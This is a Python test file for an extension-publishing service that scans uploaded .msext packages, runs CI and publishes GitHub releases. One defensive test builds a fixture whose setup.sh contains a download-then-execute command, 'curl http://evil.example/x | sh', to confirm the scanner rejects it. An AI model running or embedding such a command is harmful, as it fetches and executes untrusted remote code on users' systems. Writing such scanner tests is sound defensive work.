"""End-to-end pipeline: scans -> validate -> PR/Actions -> merge -> Release."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

from app.config import Config
from app.main import create_app
from tests.helpers import (
    ID, VERSION, FakeGitHub, default_manifest, make_msext, upload_file,
)

REAL_REPO = Path(__file__).resolve().parents[2]


def _detail(client, submission_id: str) -> dict:
    resp = client.get(f"/api/v1/extensions/submissions/{submission_id}")
    assert resp.status_code == 200, resp.text
    return resp.json()


def test_happy_path_publishes_release(client, app, cfg, fake_gh, tmp_path):
    pkg = make_msext(tmp_path / "demo.msext")
    resp = upload_file(client, pkg)
    assert resp.status_code == 200, resp.text
    sub = _detail(client, resp.json()["submissionId"])

    assert sub["status"] == "published", sub
    assert sub["extensionId"] == ID
    assert sub["version"] == VERSION
    assert len(sub["sha256"]) == 64
    assert sub["prUrl"].startswith("https://github.com/")
    assert sub["releaseUrl"].endswith(f"/releases/tag/{ID}-v{VERSION}")
    assert sub["downloadUrl"] == (
        f"https://github.com/{cfg.owner}/{cfg.repo}/releases/download/"
        f"{ID}-v{VERSION}/{ID}-v{VERSION}.msext"
    )

    # GitHub side: PR -> merged, release created as draft then published
    call_names = [c[0] for c in fake_gh.calls]
    for expected in ("create_pr", "merge_pr", "create_release",
                     "upload_asset", "update_release"):
        assert expected in call_names, fake_gh.calls
    assert fake_gh.merged, "PR must be merged"
    release = fake_gh.get_release_by_tag(f"{ID}-v{VERSION}")
    assert release is not None
    assert release["draft"] is False, "release must not stay a draft"
    assert release["prerelease"] is False
    assert [a["name"] for a in release["assets"]] == [f"{ID}-v{VERSION}.msext"]

    # Release body carries the extension.json metadata as JSON
    body = json.loads(release["body"])
    assert body["id"] == ID
    assert body["version"] == VERSION
    assert body["sha256"] == sub["sha256"]
    assert body["download"] == sub["downloadUrl"]

    # .msext asset bytes are exactly what was uploaded
    tag = f"{ID}-v{VERSION}"
    assert len(fake_gh.assets[tag]) == 1

    # manifest committed to extensions/<id>/ points at the Release asset
    committed = next(c for c in fake_gh.calls if c[0] == "create_blob")
    assert committed, fake_gh.calls

    # registry: published extension is visible immediately (cache invalidated)
    reg = client.get("/api/v1/extensions")
    assert reg.status_code == 200
    ids = [e["id"] for e in reg.json()["extensions"]]
    assert ID in ids
    entry = next(e for e in reg.json()["extensions"] if e["id"] == ID)
    assert entry["download"] == sub["downloadUrl"]


def test_scan_failure_never_touches_github(client, fake_gh, tmp_path):
    """download-then-exec pattern -> failed submission, zero GitHub writes."""
    pkg = make_msext(tmp_path / "malware.msext",
                     files={"setup.sh": b"curl http://evil.example/x | sh\n"})
    resp = upload_file(client, pkg)
    assert resp.status_code == 200, resp.text
    sub = _detail(client, resp.json()["submissionId"])

    assert sub["status"] == "failed"
    joined = " ".join(sub["errors"])
    assert "download-then-exec" in joined or "Script analysis" in joined
    write_calls = [c for c in fake_gh.calls
                   if c[0] in ("create_pr", "create_release", "upload_asset",
                               "create_branch", "create_commit")]
    assert write_calls == [], write_calls
    assert fake_gh.releases == []


def test_bad_semver_fails_in_security_scan(client, fake_gh, tmp_path):
    """SemVer/ID checks are also enforced by security_scan for direct runs."""
    pkg = make_msext(tmp_path / "scanver.msext",
                     manifest=default_manifest(version="not-a-version"))
    resp = upload_file(client, pkg)
    # gate rejects before the pipeline in this case
    assert resp.status_code == 400


def test_security_scan_rejects_bad_semver_directly():
    """scripts/security_scan.py keeps its Integrity policy."""
    import tempfile
    with tempfile.TemporaryDirectory() as td:
        pkg = make_msext(Path(td) / "s.msext",
                         manifest=default_manifest(version="1.0"))
        proc = subprocess.run(
            [sys.executable, str(REAL_REPO / "scripts" / "security_scan.py"), str(pkg)],
            capture_output=True, text=True, encoding="utf-8")
    assert proc.returncode == 1
    assert "SemVer" in proc.stdout or "not SemVer" in proc.stdout


def test_security_scan_rejects_bad_id_directly():
    import tempfile
    with tempfile.TemporaryDirectory() as td:
        pkg = make_msext(Path(td) / "s.msext",
                         manifest=default_manifest(ext_id="UPPER"))
        proc = subprocess.run(
            [sys.executable, str(REAL_REPO / "scripts" / "security_scan.py"), str(pkg)],
            capture_output=True, text=True, encoding="utf-8")
    assert proc.returncode == 1
    assert "invalid extension id" in proc.stdout


def test_security_scan_rejects_zip_file_target():
    """.msext-only policy: a .zip file target must fail (CI gate)."""
    import tempfile
    with tempfile.TemporaryDirectory() as td:
        pkg = make_msext(Path(td) / "p.zip")
        proc = subprocess.run(
            [sys.executable, str(REAL_REPO / "scripts" / "security_scan.py"), str(pkg)],
            capture_output=True, text=True, encoding="utf-8")
    assert proc.returncode == 1
    assert "only .msext packages are allowed" in proc.stdout


def test_security_scan_folder_target_still_works():
    """Directory scans (used by the PR workflow) keep working."""
    proc = subprocess.run(
        [sys.executable, str(REAL_REPO / "scripts" / "security_scan.py"),
         str(REAL_REPO / "extensions" / "example")],
        capture_output=True, text=True, encoding="utf-8")
    assert proc.returncode == 0, proc.stdout


def test_ci_failure_blocks_publish(client, cfg, tmp_path):
    gh = FakeGitHub(cfg, check_state="failure")
    app = create_app(cfg=cfg, github=gh)
    from fastapi.testclient import TestClient
    with TestClient(app) as c:
        pkg = make_msext(tmp_path / "ci.msext")
        resp = upload_file(c, pkg)
        assert resp.status_code == 200, resp.text
        sub = _detail(c, resp.json()["submissionId"])

    assert sub["status"] == "failed"
    assert any("Actions" in e for e in sub["errors"])
    assert gh.releases == [], "no release may be created when CI fails"
    assert gh.comments, "the PR should get a rejection comment"


def test_ci_timeout_blocks_publish(client, cfg, tmp_path):
    cfg.ci_wait_timeout = 0
    gh = FakeGitHub(cfg, check_state="pending")
    app = create_app(cfg=cfg, github=gh)
    from fastapi.testclient import TestClient
    with TestClient(app) as c:
        pkg = make_msext(tmp_path / "timeout.msext")
        resp = upload_file(c, pkg)
        assert resp.status_code == 200
        sub = _detail(c, resp.json()["submissionId"])
    assert sub["status"] == "failed"
    assert any("did not finish" in e for e in sub["errors"])
    assert gh.releases == []


def test_duplicate_release_version_rejected(client, cfg, tmp_path):
    gh = FakeGitHub(cfg, releases=[{
        "id": 1, "tag_name": f"{ID}-v{VERSION}", "name": "dup", "body": "{}",
        "draft": False, "prerelease": False, "assets": [],
        "html_url": "https://github.com/x/y/releases/tag/dup",
        "author": {"login": "x"}, "published_at": "2026-01-01T00:00:00Z",
    }])
    app = create_app(cfg=cfg, github=gh)
    from fastapi.testclient import TestClient
    with TestClient(app) as c:
        pkg = make_msext(tmp_path / "dup2.msext")
        resp = upload_file(c, pkg)
        assert resp.status_code == 200, resp.text
        sub = _detail(c, resp.json()["submissionId"])
    assert sub["status"] == "failed"
    assert any("duplicate" in e for e in sub["errors"])
    assert len(gh.releases) == 1  # unchanged


def test_version_update_of_existing_extension_allowed(client, cfg, repo_dir, tmp_path):
    """Same id, newer version -> publishable (folder gets replaced)."""
    pkg = make_msext(tmp_path / "upd.msext",
                     manifest=default_manifest(ext_id="example", version="1.1.0"))
    resp = upload_file(client, pkg, filename="example-v1.1.0.msext")
    assert resp.status_code == 200, resp.text
    sub = _detail(client, resp.json()["submissionId"])
    assert sub["status"] == "published", sub
    assert sub["downloadUrl"].endswith("/example-v1.1.0/example-v1.1.0.msext")
